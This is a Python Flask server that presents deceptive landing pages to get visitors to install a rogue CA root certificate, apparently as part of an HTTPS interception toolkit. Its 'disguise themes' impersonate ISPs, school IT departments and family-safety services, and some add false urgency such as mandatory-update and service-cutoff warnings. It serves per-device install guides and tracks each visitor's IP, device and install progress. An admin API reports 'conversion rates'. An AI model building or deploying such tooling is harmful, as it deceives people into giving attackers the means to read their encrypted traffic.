"""
Certificate Installer Web Server.

Provides a convincing landing page for CA certificate installation.
Features:
- Device detection (Android, iOS, Windows, Mac)
- Device-specific installation guides
- Certificate download
- Installation tracking
- Multiple disguise themes (WiFi Security, Network Optimization, etc.)
"""

import json
import os
import socket
import sys
import uuid
from datetime import datetime
from functools import wraps
from pathlib import Path
from typing import Any, Dict, List, Optional

from flask import (
    Flask,
    jsonify,
    redirect,
    render_template,
    request,
    send_file,
    session,
    url_for,
)

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "python"))

try:
    from https.cert_generator import CertificateGenerator, CERT_PROFILES
except ImportError:
    CertificateGenerator = None
    CERT_PROFILES = {}

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Configuration
CONFIG = {
    "theme": "wifi_security",  # wifi_security, network_optimizer, isp_update
    "company_name": "Network Security Services",
    "support_email": "support@network-security.local",
    "cert_profile": "wifi_security",
    "require_install": False,  # Redirect all traffic until cert installed
    "track_installs": True,
}

# Installation tracking
INSTALLATIONS: Dict[str, Dict[str, Any]] = {}

# Theme configurations
THEMES = {
    "wifi_security": {
        "title": "WiFi Security Update Required",
        "subtitle": "Your network administrator requires a security certificate",
        "company": "Network Security Services",
        "logo_color": "#2563eb",  # Blue
        "accent_color": "#3b82f6",
        "icon": "shield-check",
        "urgency": "medium",
        "messages": {
            "main": "To ensure secure browsing on this network, please install the security certificate.",
            "why": "This certificate enables encrypted communication and protects your data.",
            "time": "Installation takes less than 2 minutes.",
        }
    },
    "network_optimizer": {
        "title": "Network Optimization Available",
        "subtitle": "Improve your browsing speed and security",
        "company": "ISP Network Services",
        "logo_color": "#059669",  # Green
        "accent_color": "#10b981",
        "icon": "bolt",
        "urgency": "low",
        "messages": {
            "main": "Install this certificate to enable optimized routing and faster connections.",
            "why": "Our optimization service reduces latency and improves security.",
            "time": "Quick 1-minute setup.",
        }
    },
    "isp_update": {
        "title": "Important: ISP Security Update",
        "subtitle": "Action required for continued internet access",
        "company": "Internet Service Provider",
        "logo_color": "#dc2626",  # Red
        "accent_color": "#ef4444",
        "icon": "exclamation-triangle",
        "urgency": "high",
        "messages": {
            "main": "Your ISP requires this security update for continued service.",
            "why": "This update is mandatory for all users as of this month.",
            "time": "Complete this update now to avoid service interruption.",
        }
    },
    "school_network": {
        "title": "School Network Access",
        "subtitle": "Certificate required for network access",
        "company": "School IT Department",
        "logo_color": "#7c3aed",  # Purple
        "accent_color": "#8b5cf6",
        "icon": "academic-cap",
        "urgency": "medium",
        "messages": {
            "main": "Install the school security certificate to access the network.",
            "why": "This certificate is required by school policy for all devices.",
            "time": "Setup takes about 2 minutes.",
        }
    },
    "parental_controls": {
        "title": "Family Safety Setup",
        "subtitle": "Protecting your family online",
        "company": "Family Safety",
        "logo_color": "#0891b2",  # Cyan
        "accent_color": "#06b6d4",
        "icon": "users",
        "urgency": "low",
        "messages": {
            "main": "Complete the family safety setup for protected browsing.",
            "why": "This helps keep everyone safe while using the internet.",
            "time": "Quick and easy setup.",
        }
    },
}


def get_device_info(user_agent: str) -> Dict[str, Any]:
    """
    Detect device type from User-Agent string.
    
    Returns device info including OS, browser, and device type.
    """
    ua = user_agent.lower()
    
    info = {
        "os": "unknown",
        "os_version": "",
        "browser": "unknown",
        "device_type": "desktop",
        "is_mobile": False,
    }
    
    # Detect OS
    if "iphone" in ua or "ipad" in ua:
        info["os"] = "ios"
        info["device_type"] = "iphone" if "iphone" in ua else "ipad"
        info["is_mobile"] = True
        # Extract version
        import re
        match = re.search(r'os (\d+)[_.](\d+)', ua)
        if match:
            info["os_version"] = f"{match.group(1)}.{match.group(2)}"
    
    elif "android" in ua:
        info["os"] = "android"
        info["device_type"] = "phone" if "mobile" in ua else "tablet"
        info["is_mobile"] = True
        import re
        match = re.search(r'android (\d+\.?\d*)', ua)
        if match:
            info["os_version"] = match.group(1)
    
    elif "windows" in ua:
        info["os"] = "windows"
        if "windows nt 10" in ua:
            info["os_version"] = "10/11"
        elif "windows nt 6.3" in ua:
            info["os_version"] = "8.1"
        elif "windows nt 6.1" in ua:
            info["os_version"] = "7"
    
    elif "macintosh" in ua or "mac os" in ua:
        info["os"] = "macos"
        import re
        match = re.search(r'mac os x (\d+)[_.](\d+)', ua)
        if match:
            info["os_version"] = f"{match.group(1)}.{match.group(2)}"
    
    elif "linux" in ua:
        info["os"] = "linux"
        if "ubuntu" in ua:
            info["os_version"] = "Ubuntu"
        elif "fedora" in ua:
            info["os_version"] = "Fedora"
    
    elif "chromeos" in ua:
        info["os"] = "chromeos"
    
    # Detect browser
    if "edg/" in ua:
        info["browser"] = "edge"
    elif "chrome" in ua and "safari" in ua:
        info["browser"] = "chrome"
    elif "firefox" in ua:
        info["browser"] = "firefox"
    elif "safari" in ua and "chrome" not in ua:
        info["browser"] = "safari"
    
    return info


def get_install_route(device_info: Dict[str, Any]) -> str:
    """Get the appropriate installation route for the device."""
    os_type = device_info["os"]
    
    if os_type == "ios":
        return "install_ios"
    elif os_type == "android":
        return "install_android"
    elif os_type == "windows":
        return "install_windows"
    elif os_type == "macos":
        return "install_macos"
    elif os_type == "linux":
        return "install_linux"
    elif os_type == "chromeos":
        return "install_chromeos"
    else:
        return "install_generic"


def track_visit(device_info: Dict[str, Any], page: str):
    """Track a page visit."""
    if not CONFIG["track_installs"]:
        return
    
    visitor_id = session.get("visitor_id")
    if not visitor_id:
        visitor_id = str(uuid.uuid4())
        session["visitor_id"] = visitor_id
    
    ip = request.remote_addr
    
    if visitor_id not in INSTALLATIONS:
        INSTALLATIONS[visitor_id] = {
            "id": visitor_id,
            "ip": ip,
            "device_info": device_info,
            "first_visit": datetime.now().isoformat(),
            "last_visit": datetime.now().isoformat(),
            "pages_visited": [],
            "cert_downloaded": False,
            "cert_download_time": None,
            "install_completed": False,
            "install_time": None,
        }
    
    INSTALLATIONS[visitor_id]["last_visit"] = datetime.now().isoformat()
    if page not in INSTALLATIONS[visitor_id]["pages_visited"]:
        INSTALLATIONS[visitor_id]["pages_visited"].append(page)


def track_download(visitor_id: str):
    """Track certificate download."""
    if visitor_id in INSTALLATIONS:
        INSTALLATIONS[visitor_id]["cert_downloaded"] = True
        INSTALLATIONS[visitor_id]["cert_download_time"] = datetime.now().isoformat()


def track_install_complete(visitor_id: str):
    """Track installation completion."""
    if visitor_id in INSTALLATIONS:
        INSTALLATIONS[visitor_id]["install_completed"] = True
        INSTALLATIONS[visitor_id]["install_time"] = datetime.now().isoformat()


def get_theme() -> Dict[str, Any]:
    """Get current theme configuration."""
    theme_name = CONFIG.get("theme", "wifi_security")
    return THEMES.get(theme_name, THEMES["wifi_security"])


def get_certificate_path() -> Optional[Path]:
    """Get path to the CA certificate."""
    if CertificateGenerator is None:
        return None
    
    try:
        generator = CertificateGenerator()
        cert_info = generator.get_active_certificate()
        
        if cert_info:
            return Path(cert_info.ca_cert_path)
        
        # Generate a new certificate if none exists
        cert_info = generator.generate_ca_certificate(
            profile_name=CONFIG.get("cert_profile", "wifi_security")
        )
        return Path(cert_info.ca_cert_path)
    
    except Exception as e:
        print(f"Error getting certificate: {e}")
        return None


def get_server_ip() -> str:
    """Get the server's IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "192.168.1.1"


# Routes

@app.route("/")
def index():
    """Main landing page."""
    device_info = get_device_info(request.headers.get("User-Agent", ""))
    track_visit(device_info, "index")
    
    theme = get_theme()
    install_route = get_install_route(device_info)
    
    return render_template(
        "index.html",
        theme=theme,
        device_info=device_info,
        install_url=url_for(install_route),
        server_ip=get_server_ip(),
        config=CONFIG,
    )


@app.route("/install/ios")
def install_ios():
    """iOS installation guide."""
    device_info = get_device_info(request.headers.get("User-Agent", ""))
    track_visit(device_info, "install_ios")
    
    theme = get_theme()
    
    return render_template(
        "ios.html",
        theme=theme,
        device_info=device_info,
        cert_url=url_for("download_cert", format="pem"),
        config=CONFIG,
    )


@app.route("/install/android")
def install_android():
    """Android installation guide."""
    device_info = get_device_info(request.headers.get("User-Agent", ""))
    track_visit(device_info, "install_android")
    
    theme = get_theme()
    
    return render_template(
        "android.html",
        theme=theme,
        device_info=device_info,
        cert_url=url_for("download_cert", format="der"),
        config=CONFIG,
    )


@app.route("/install/windows")
def install_windows():
    """Windows installation guide."""
    device_info = get_device_info(request.headers.get("User-Agent", ""))
    track_visit(device_info, "install_windows")
    
    theme = get_theme()
    
    return render_template(
        "windows.html",
        theme=theme,
        device_info=device_info,
        cert_url=url_for("download_cert", format="cer"),
        config=CONFIG,
    )


@app.route("/install/macos")
def install_macos():
    """macOS installation guide."""
    device_info = get_device_info(request.headers.get("User-Agent", ""))
    track_visit(device_info, "install_macos")
    
    theme = get_theme()
    
    return render_template(
        "macos.html",
        theme=theme,
        device_info=device_info,
        cert_url=url_for("download_cert", format="pem"),
        config=CONFIG,
    )


@app.route("/install/linux")
def install_linux():
    """Linux installation guide."""
    device_info = get_device_info(request.headers.get("User-Agent", ""))
    track_visit(device_info, "install_linux")
    
    theme = get_theme()
    
    return render_template(
        "linux.html",
        theme=theme,
        device_info=device_info,
        cert_url=url_for("download_cert", format="pem"),
        config=CONFIG,
    )


@app.route("/install/chromeos")
def install_chromeos():
    """ChromeOS installation guide."""
    device_info = get_device_info(request.headers.get("User-Agent", ""))
    track_visit(device_info, "install_chromeos")
    
    theme = get_theme()
    
    return render_template(
        "chromeos.html",
        theme=theme,
        device_info=device_info,
        cert_url=url_for("download_cert", format="pem"),
        config=CONFIG,
    )


@app.route("/install/generic")
def install_generic():
    """Generic installation guide."""
    device_info = get_device_info(request.headers.get("User-Agent", ""))
    track_visit(device_info, "install_generic")
    
    theme = get_theme()
    
    return render_template(
        "generic.html",
        theme=theme,
        device_info=device_info,
        cert_url=url_for("download_cert", format="pem"),
        config=CONFIG,
    )


@app.route("/download/cert")
@app.route("/download/cert.<format>")
def download_cert(format: str = "pem"):
    """Download the CA certificate."""
    visitor_id = session.get("visitor_id")
    if visitor_id:
        track_download(visitor_id)
    
    cert_path = get_certificate_path()
    
    if cert_path is None or not cert_path.exists():
        return "Certificate not available", 500
    
    # Convert format if needed
    if format == "der" or format == "cer":
        # Convert PEM to DER
        try:
            if CertificateGenerator:
                generator = CertificateGenerator()
                der_path = generator.export_for_device(str(cert_path), "der")
                cert_path = Path(der_path)
        except Exception as e:
            print(f"Error converting certificate: {e}")
    
    # Set appropriate filename and content type
    if format == "der":
        filename = "network-security.der"
        mimetype = "application/x-x509-ca-cert"
    elif format == "cer":
        filename = "network-security.cer"
        mimetype = "application/x-x509-ca-cert"
    else:
        filename = "network-security.pem"
        mimetype = "application/x-pem-file"
    
    return send_file(
        cert_path,
        as_attachment=True,
        download_name=filename,
        mimetype=mimetype
    )


@app.route("/complete")
def install_complete():
    """Installation complete confirmation."""
    visitor_id = session.get("visitor_id")
    if visitor_id:
        track_install_complete(visitor_id)
    
    device_info = get_device_info(request.headers.get("User-Agent", ""))
    track_visit(device_info, "complete")
    
    theme = get_theme()
    
    return render_template(
        "complete.html",
        theme=theme,
        device_info=device_info,
        config=CONFIG,
    )


@app.route("/verify")
def verify_install():
    """Verify certificate installation via HTTPS test."""
    # This would be accessed via HTTPS after cert install
    return jsonify({
        "success": True,
        "message": "Certificate is properly installed!",
        "timestamp": datetime.now().isoformat()
    })


# Admin API routes

@app.route("/api/stats")
def api_stats():
    """Get installation statistics."""
    total_visits = len(INSTALLATIONS)
    downloads = sum(1 for v in INSTALLATIONS.values() if v["cert_downloaded"])
    installs = sum(1 for v in INSTALLATIONS.values() if v["install_completed"])
    
    # Device breakdown
    device_counts = {}
    for visitor in INSTALLATIONS.values():
        os_type = visitor["device_info"].get("os", "unknown")
        device_counts[os_type] = device_counts.get(os_type, 0) + 1
    
    return jsonify({
        "total_visits": total_visits,
        "cert_downloads": downloads,
        "installs_completed": installs,
        "conversion_rate": (installs / total_visits * 100) if total_visits > 0 else 0,
        "device_breakdown": device_counts,
    })


@app.route("/api/visitors")
def api_visitors():
    """Get visitor details."""
    return jsonify({
        "visitors": list(INSTALLATIONS.values())
    })


@app.route("/api/config", methods=["GET", "POST"])
def api_config():
    """Get or update configuration."""
    if request.method == "POST":
        data = request.get_json()
        if data:
            for key, value in data.items():
                if key in CONFIG:
                    CONFIG[key] = value
        return jsonify({"success": True, "config": CONFIG})
    
    return jsonify({
        "config": CONFIG,
        "available_themes": list(THEMES.keys()),
        "available_cert_profiles": list(CERT_PROFILES.keys()) if CERT_PROFILES else [],
    })


@app.route("/api/theme/<theme_name>")
def api_set_theme(theme_name: str):
    """Set the active theme."""
    if theme_name in THEMES:
        CONFIG["theme"] = theme_name
        return jsonify({"success": True, "theme": theme_name})
    return jsonify({"success": False, "error": "Unknown theme"}), 400


# Error handlers

@app.errorhandler(404)
def not_found(e):
    """Handle 404 errors."""
    return redirect(url_for("index"))


@app.errorhandler(500)
def server_error(e):
    """Handle 500 errors."""
    return render_template(
        "error.html",
        error="An error occurred. Please try again.",
        theme=get_theme(),
    ), 500


def run_server(
    host: str = "0.0.0.0",
    port: int = 80,
    debug: bool = False,
    theme: str = "wifi_security",
    cert_profile: str = "wifi_security"
):
    """
    Run the certificate installer server.
    
    Args:
        host: Host to bind to
        port: Port to listen on
        debug: Enable debug mode
        theme: Theme to use
        cert_profile: Certificate profile to use
    """
    CONFIG["theme"] = theme
    CONFIG["cert_profile"] = cert_profile
    
    print(f"\n{'='*50}")
    print("Certificate Installer Server")
    print(f"{'='*50}")
    print(f"Server URL: http://{get_server_ip()}:{port}")
    print(f"Theme: {theme}")
    print(f"Certificate Profile: {cert_profile}")
    print(f"{'='*50}\n")
    
    app.run(host=host, port=port, debug=debug)


def main():
    """CLI entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Certificate Installer Web Server")
    parser.add_argument("--host", default="0.0.0.0", help="Host to bind to")
    parser.add_argument("--port", type=int, default=80, help="Port to listen on")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--theme", default="wifi_security",
                       choices=list(THEMES.keys()),
                       help="Theme to use")
    parser.add_argument("--cert-profile", default="wifi_security",
                       help="Certificate profile to use")
    parser.add_argument("--list-themes", action="store_true",
                       help="List available themes")
    
    args = parser.parse_args()
    
    if args.list_themes:
        print("\nAvailable Themes:")
        print("-" * 40)
        for name, theme in THEMES.items():
            print(f"\n{name}:")
            print(f"  Title: {theme['title']}")
            print(f"  Urgency: {theme['urgency']}")
        return
    
    run_server(
        host=args.host,
        port=args.port,
        debug=args.debug,
        theme=args.theme,
        cert_profile=args.cert_profile
    )


if __name__ == "__main__":
    main()
